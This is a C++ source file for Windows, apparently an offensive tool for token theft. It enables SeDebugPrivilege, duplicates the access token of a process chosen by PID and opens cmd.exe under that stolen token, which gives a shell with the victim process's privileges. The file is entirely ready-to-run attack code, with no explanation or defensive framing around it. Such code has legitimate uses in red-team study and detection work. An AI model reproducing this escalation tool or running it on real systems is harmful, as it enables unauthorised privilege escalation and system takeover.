#include <windows.h>
#include <iostream>
#include <string>  // Add this for std::stoi()


// Function to enable a privilege for the current process
BOOL SetPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // Retrieve LUID for the privilege
    if (!LookupPrivilegeValue(NULL, priv, &luid)) {
        std::cerr << "Failed to lookup privilege: " << priv << std::endl;
        return FALSE;
    }

    // Open the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) {
        std::cerr << "Failed to open process token." << std::endl;
        return FALSE;
    }

    // Set the privilege
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        std::cerr << "Failed to adjust token privileges." << std::endl;
        CloseHandle(token);
        return FALSE;
    }

    CloseHandle(token);
    std::cout << "Successfully enabled privilege: " << priv << std::endl;
    return TRUE;
}

// Function to get an access token from a target process
HANDLE GetToken(DWORD pid) {
    HANDLE processHandle = (pid == 0) ? GetCurrentProcess() : OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
    if (!processHandle) {
        std::cerr << "Failed to get process handle." << std::endl;
        return NULL;
    }

    HANDLE tokenHandle;
    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle)) {
        std::cerr << "Failed to get process token." << std::endl;
        CloseHandle(processHandle);
        return NULL;
    }

    CloseHandle(processHandle);
    std::cout << "Successfully obtained access token." << std::endl;
    return tokenHandle;
}

// Function to create a new process using a stolen token
BOOL CreateElevatedProcess(HANDLE token, LPCWSTR appPath) {
    HANDLE duplicateToken;
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateToken)) {
        std::cerr << "Failed to duplicate process token." << std::endl;
        return FALSE;
    }

    BOOL result = CreateProcessWithTokenW(duplicateToken, LOGON_WITH_PROFILE, appPath, NULL, 0, NULL, NULL, &si, &pi);
    if (!result) {
        std::cerr << "Failed to create process." << std::endl;
    } else {
        std::cout << "Successfully created process: " << appPath << std::endl;
    }

    CloseHandle(duplicateToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return result;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <PID>" << std::endl;
        return -1;
    }

    if (!SetPrivilege(SE_DEBUG_NAME)) return -1;

    DWORD pid = std::stoi(argv[1]);
    HANDLE token = GetToken(pid);
    if (!token) return -1;

    CreateElevatedProcess(token, L"C:\\Windows\\System32\\cmd.exe");
    CloseHandle(token);

    return 0;
}
